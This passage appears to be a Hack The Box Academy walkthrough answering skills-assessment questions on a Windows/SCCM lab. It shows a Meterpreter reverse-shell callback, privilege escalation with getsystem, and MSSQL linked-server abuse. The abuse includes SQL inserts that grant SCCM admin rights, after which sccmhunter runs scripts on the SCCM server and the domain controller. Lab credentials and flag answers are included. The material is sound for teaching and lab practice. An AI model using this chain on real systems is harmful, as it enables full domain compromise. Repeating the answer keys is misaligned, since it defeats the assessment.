Students will notice the log in the Python HTTP server related to downloading the PowerShell reverse shell payload:

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [29/Aug/2024 01:14:43] "GET /s HTTP/1.1" 200 -
```

Subsequently, they will see a new meterpreter session being established:

```
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> 
[*] Started HTTPS reverse handler on https://10.10.14.68:8888
[!] https://10.10.14.68:8888 handling request from 10.129.231.78; (UUID: w6ufi3ca) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.68:8888 handling request from 10.129.231.78; (UUID: w6ufi3ca) Staging x64 payload (201820 bytes) ...
[!] https://10.10.14.68:8888 handling request from 10.129.231.78; (UUID: w6ufi3ca) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.68:8888 -> 10.129.231.78:63101) at 2024-08-29 01:14:56 -0500
```

Students will interact with the established session and enumerate the privileges of the current user context:

Code: shell

```shell
sessions -i 1
getprivs
```

```
[msf](Jobs:1 Agents:1) exploit(multi/handler) >> sessions -i 1
[*] Starting interaction with 1...
(Meterpreter 1)(C:\Windows\system32) > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeManageVolumePrivilege
```

\`\` Subsequently, students will use the `getsystem` command to obtain a session in the context of `NT AUTHORITY\SYSTEM` to perform a privilege escalation using the `SeImpersonatePrivilege` privilege:

Code: shell

```shell
getsystem
```

```
(Meterpreter 1)(C:\Windows\system32) > getsystem
...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
```

Students can grab the flag from `C:\Users\Administrator\Desktop`:

Code: shell

```shell
cat C:/Users/Administrator/Desktop/flag.txt
```

```
(Meterpreter 1)(C:\Windows\system32) > cat C:/Users/Administrator/Desktop/flag.txt

{hidden}
```

Answer: `b7cdb05141a266d799d59aa3ba418cec`

# Skills Assessment

## Question 4

### "What's the content of the file C:\\Users\\sccmadmin\\Desktop\\flag.txt in SCCM?"

Students will open a new terminal tab, activate the previously created Python virtual environment, and connect to the database `DB01`, change the login to `sa` :

Code: shell

```shell
source .impacket/bin/activate
python3 examples/mssqlclient.py FREIGHTLOGISTIC/ron.mcginnis:lasaer81@172.16.20.30 -windows-auth
exec_as_login sa
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ source .impacket/bin/activate

(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ python3 examples/mssqlclient.py FREIGHTLOGISTIC/ron.mcginnis:lasaer81@172.16.20.30 -windows-auth

Impacket v0.12.0.dev1+20240828.175257.27e7e747 - Copyright 2023 Fortra
<SNIP>
[!] Press help for extra shell commands
SQL (FREIGHTLOGISTIC\ron.mcginnis  dbo@master)> exec_as_login sa
```

Subsequently, students will use the link to `DB02` and enumerate the links of the database, finding a link to a database instance called `SCCM`:

Code: shell

```shell
use_links DB02
enum_links
```

```
SQL (sa  dbo@master)> use_link DB02
SQL >DB02 (sa  dbo@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
db02       SQLNCLI            SQL Server    db02             NULL                 NULL           NULL      

SCCM       SQLNCLI            SQL Server    SCCM             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
db02            NULL                        1   NULL           

SCCM            NULL                        0   sccmadmin     
```

They will utilize the link to `SCCM` and enumerate the databases of the link to find the `CM_FLT` database:

Code: shell

```shell
use_link SCCM
enum_db
```

```
SQL >DB02 (sa  dbo@master)> use_link SCCM
SQL >DB02>SCCM (sccmadmin  dbo@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
SUSDB                    0   
CM_FLT                   1 
```

Students will enumerate the tables in the database and will look for a table called `RBAC_Admins`:

Code: sql

```sql
use CM_FLT; SELECT TABLE_NAME,TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'RBAC_Admins' AND TABLE_TYPE = 'BASE TABLE' ;
```

```
SQL >DB02>SCCM (sccmadmin  dbo@master)> use CM_FLT; SELECT TABLE_NAME,TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'RBAC_Admins' AND TABLE_TYPE = 'BASE TABLE' ;

INFO(SCCM): Line 1: Changed database context to 'CM_FLT'.
TABLE_NAME    TABLE_TYPE   
-----------   ----------   
RBAC_Admins   b'BASE TABLE'
```

Students will return to the previously established RDP session, query the SID of `htb-student`, and convert it to binary using the `PowerShell` session:

Code: powershell

```powershell
Get-ADUser -Filter 'Name -like "*htb-student"' | select SID

function Convert-StringSidToBinary {
 param (
 [Parameter(Mandatory=$true, Position=0)]
 [string]$StringSid
 )

 $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
 $binarySid = New-Object byte[] ($sid.BinaryLength)
 $sid.GetBinaryForm($binarySid, 0)
        
 $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
 echo "0x$($binarySidHex.ToLower())"
}

Convert-StringSidToBinary S-1-5-21-2239140805-1785796159-1814936830-1146
```

```
PS C:\Users\htb-student> Get-ADUser -Filter 'Name -like "*htb-student"' | select SID

SID
---
S-1-5-21-2239140805-1785796159-1814936830-1146

PS C:\Users\htb-student> function Convert-StringSidToBinary {
>>  param (
>>  [Parameter(Mandatory=$true, Position=0)]
>>  [string]$StringSid
>>  )
>>
>>  $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
>>  $binarySid = New-Object byte[] ($sid.BinaryLength)
>>  $sid.GetBinaryForm($binarySid, 0)
>>
>>  $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
>>  echo "0x$($binarySidHex.ToLower())"
>> }

PS C:\Users\htb-student> Convert-StringSidToBinary S-1-5-21-2239140805-1785796159-1814936830-1146

0x010500000000000515000000c59376853f16716afebc2d6c7a040000
```

Students will return to the `mssqclient.py` session, and are going to add `htb-student` to the `RBAC_Admins` table using the previously converted SID to binary:

Code: shell

```shell
USE CM_FLT;INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000c59376853f16716afebc2d6c7a040000,'FREIGHTLOGISTIC\htb-student',0,0,'','','','','HTB');
```

```
SQL >DB02>SCCM (sccmadmin  dbo@master)> USE CM_FLT;INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000c59376853f16716afebc2d6c7a040000,'FREIGHTLOGISTIC\htb-student',0,0,'','','','','HTB');
INFO(SCCM): Line 1: Changed database context to 'CM_FLT'.
```

Students will query the `RBAC_Admins` table to obtain the AdminID of `htb-student`:

Code: sql

```sql
use CM_FLT;select * from RBAC_Admins;
```

```
SQL >DB02>SCCM (sccmadmin  dbo@master)> use CM_FLT;select * from RBAC_Admins;
INFO(SCCM): Line 1: Changed database context to 'CM_FLT'.
 AdminID                                                      AdminSID   LogonName                     DisplayName   IsGroup   IsDeleted   CreatedBy                   CreatedDate   ModifiedBy                  ModifiedDate   SourceSite   DistinguishedName   AccountType   
--------   -----------------------------------------------------------   ---------------------------   -----------   -------   ---------   -------------------------   -----------   -------------------------   ------------   ----------   -----------------   -----------   
16777217   b'010500000000000515000000c59376853f16716afebc2d6c44060000'   FREIGHTLOGISTIC\sccmadmin     SCCM Admin          0           0   FREIGHTLOGISTIC\sccmadmin   2024-07-18 18:54:46   FREIGHTLOGISTIC\sccmadmin   2024-07-18 18:54:46   FLT          NULL                       NULL   

16777219   b'010500000000000515000000c59376853f16716afebc2d6c7a040000'   FREIGHTLOGISTIC\htb-student   NULL                0           0                               1900-01-01 00:00:00                               1900-01-01 00:00:00   HTB          NULL                       NULL
```

Subsequently, they will update the roles of `htb-student` using his `AdminID`:

Code: sql

```sql
USE CM_FLT;INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777219,'SMS0001R','SMS00ALL','29');
USE CM_FLT;INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777219,'SMS0001R','SMS00001','1');
USE CM_FLT;INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777219,'SMS0001R','SMS00004','1');
```

```
SQL >DB02>SCCM (sccmadmin  dbo@master)> USE CM_FLT;INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777219,'SMS0001R','SMS00ALL','29');
INFO(SCCM): Line 1: Changed database context to 'CM_FLT'.
SQL >DB02>SCCM (sccmadmin  dbo@master)> USE CM_FLT;INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777219,'SMS0001R','SMS00001','1');
INFO(SCCM): Line 1: Changed database context to 'CM_FLT'.
SQL >DB02>SCCM (sccmadmin  dbo@master)> USE CM_FLT;INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777219,'SMS0001R','SMS00004','1')
INFO(SCCM): Line 1: Changed database context to 'CM_FLT'.
```

Students will open a new terminal tab, clone `sccmhunter`, initiate a Python virtual environment, and install the requirements:

Code: shell

```shell
cd ~
git clone -q https://github.com/garrettfoster13/sccmhunter
cd sccmhunter/
python3 -m venv .sccmhunter
source .sccmhunter/bin/activate
python3 -m pip install -r requirements.txt
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ cd ~
git clone -q https://github.com/garrettfoster13/sccmhunter
cd sccmhunter/
python3 -m venv .sccmhunter
source .sccmhunter/bin/activate
python3 -m pip install -r requirements.txt

Collecting cmd2==2.4.3
  Downloading cmd2-2.4.3-py3-none-any.whl (147 kB)
<SNIP>
```

Subsequently, students will utilize `sccmhunter` and connect to the `172.16.20.50` (`SCCM`) host using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
python3 sccmhunter.py admin -u htb-student -p 'HTB_@cademy_stdnt!' -ip 172.16.20.50
```

```
(.sccmhunter) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/sccmhunter]
└──╼ [★]$ python3 sccmhunter.py admin -u htb-student -p 'HTB_@cademy_stdnt!' -ip 172.16.20.50

SCCMHunter v1.0.5 by @garrfoster
[02:03:45] INFO     [!] First time use detected.
[02:03:45] INFO     [!] SCCMHunter data will be saved to /home/htb-ac-8414/.sccmhunter
[02:03:45] INFO     [!] Enter help for extra shell commands                                                                                                                                   
() C:\ >> 
```

Students will add `ron.mcginnis` to the admins to perform script execution and use his credentials to approve script executions:

Code: shell

```shell
get_user ron.mcginnis
add_admin FREIGHTLOGISTICS\ron.mcginnis S-1-5-21-2239140805-1785796159-1814936830-1147
exit
```

```
() C:\ >> get_user ron.mcginnis
[02:07:13] INFO     [*] Collecting users...
[02:07:13] INFO     [+] User found.
[02:07:13] INFO     ------------------------------------------
<SNIP>
                    sid: S-1-5-21-2239140805-1785796159-1814936830-1147
                    UniqueUserName: FREIGHTLOGISTIC\ron.mcginnis
<SNIP>
() (C:\) >> add_admin FREIGHTLOGISTICS\ron.mcginnis S-1-5-21-2239140805-1785796159-1814936830-1147
[02:07:32] INFO     Tasked SCCM to add FREIGHTLOGISTICS\ron.mcginnis as an administrative user.                                                                                               
[02:07:34] INFO     [+] Successfully added FREIGHTLOGISTICS\ron.mcginnis as an admin.                                                                                                         
() (C:\) >> exit
```

Subsequently, students will create a text file containing the command execution to obtain the flag from the `C:\Users\sccmadmin\Desktop` directory:

```shell
echo "cmd /c type C:\Users\sccmadmin\Desktop\flag.txt" > script.txt
```
```
(.sccmhunter) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/sccmhunter]
└──╼ [★]$ echo "cmd /c type C:\Users\sccmadmin\Desktop\flag.txt" > script.txt
```

Students will reestablish the `sccmhunter` session while supplying the credentials `ron.mcginnis:lasaer81` as the second admin for approval of scripts, interact with the `SCCM` host using its `ResourceID` and execute the script:

```shell
python3 sccmhunter.py admin -u htb-student -p 'HTB_@cademy_stdnt!' -ip 172.16.20.50 -au ron.mcginnis -ap lasaer81
get_device SCCM
interact 16777219
script script.txt
```
```
(.sccmhunter) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/sccmhunter]
└──╼ [★]$ python3 sccmhunter.py admin -u htb-student -p 'HTB_@cademy_stdnt!' -ip 172.16.20.50 -au ron.mcginnis -ap lasaer81
SCCMHunter v1.0.5 by @garrfoster
[02:11:01] INFO     [!] Enter help for extra shell commands 
() (C:\) >> get_device SCCM
[02:12:17] INFO     [*] Collecting device...
[02:12:17] INFO     [+] Device found.
[02:12:17] INFO     ------------------------------------------                   <SNIP>                                                                   
                    ResourceId: 16777219
                    ResourceNames: SCCM.freightlogistics.local                   <SNIP>                                                                                                                           
() (C:\) >> interact 16777219
(16777219) (C:\) >> script script.txt

[02:12:41] INFO     [+] Updates script created successfully with GUID c4f19fc9-3a0d-4e6f-8a37-fc7925bcc18e.
[02:12:42] INFO     [+] Script with guid c4f19fc9-3a0d-4e6f-8a37-fc7925bcc18e approved.
[02:12:42] INFO     [+] Script with guid c4f19fc9-3a0d-4e6f-8a37-fc7925bcc18e executed.
[02:12:58] INFO     [+] Got result:
[02:12:58] INFO     {hidden}
[02:12:58] INFO     [+] Script with GUID c4f19fc9-3a0d-4e6f-8a37-fc7925bcc18e deleted.
```

Answer: `SCCM_Compromised_9301`

# Skills Assessment

## Question 5

### "What's the content of the file C:\\Users\\Administrator\\Desktop\\flag.txt in DC01?"

Students will exit the previously established session in `sccmhunter`, and will modify the `script.txt` file:

```shell
exit
sed -i 's/sccmadmin/Administrator/g' script.txt
```
```
(16777219) (C:\) >> exit
(.sccmhunter) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/sccmhunter]
└──╼ [★]$ sed -i 's/sccmadmin/Administrator/g' script.txt 
```

Subsequently, students will reestablish the session, obtain the `ResourceID` of the `DC01` host, and interact with it:

```shell
python3 sccmhunter.py admin -u htb-student -p 'HTB_@cademy_stdnt!' -ip 172.16.20.50 -au ron.mcginnis -ap lasaer81
get_device DC01
interact
```
```
(.sccmhunter) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/sccmhunter]
└──╼ [★]$ python3 sccmhunter.py admin -u htb-student -p 'HTB_@cademy_stdnt!' -ip 172.16.20.50 -au ron.mcginnis -ap lasaer81

SCCMHunter v1.0.5 by @garrfoster
[02:19:02] INFO     [!] Enter help for extra shell commands
() C:\ >> get_device DC01
[02:19:10] INFO     [*] Collecting device...
[02:19:10] INFO     [+] Device found.
[02:19:10] INFO     ------------------------------------------
<SNIP>
                    ResourceId: 16777220
                    ResourceNames: DC01.freightlogistics.local                   <SNIP>
() (C:\) >> interact 16777220
```

Subsequently, students will execute the command in the `script.txt` by running the script and obtaining the flag:

```shell
script scrip.txt
```
```
(16777220) (C:\) >> script script.txt
[02:20:06] INFO     [+] Updates script created successfully with GUID ff899fa2-e41d-4665-b8c5-26e86154c539.
[02:20:07] INFO     [+] Script with guid ff899fa2-e41d-4665-b8c5-26e86154c539 approved.
[02:20:07] INFO     [+] Script with guid ff899fa2-e41d-4665-b8c5-26e86154c539 executed.
[02:20:24] INFO     [+] Got result:
[02:20:24] INFO     {hidden}
[02:20:24] INFO     [+] Script with GUID ff899fa2-e41d-4665-b8c5-26e86154c539 deleted. 
```

Answer: `DA_Access_Pwn_Windows_Services`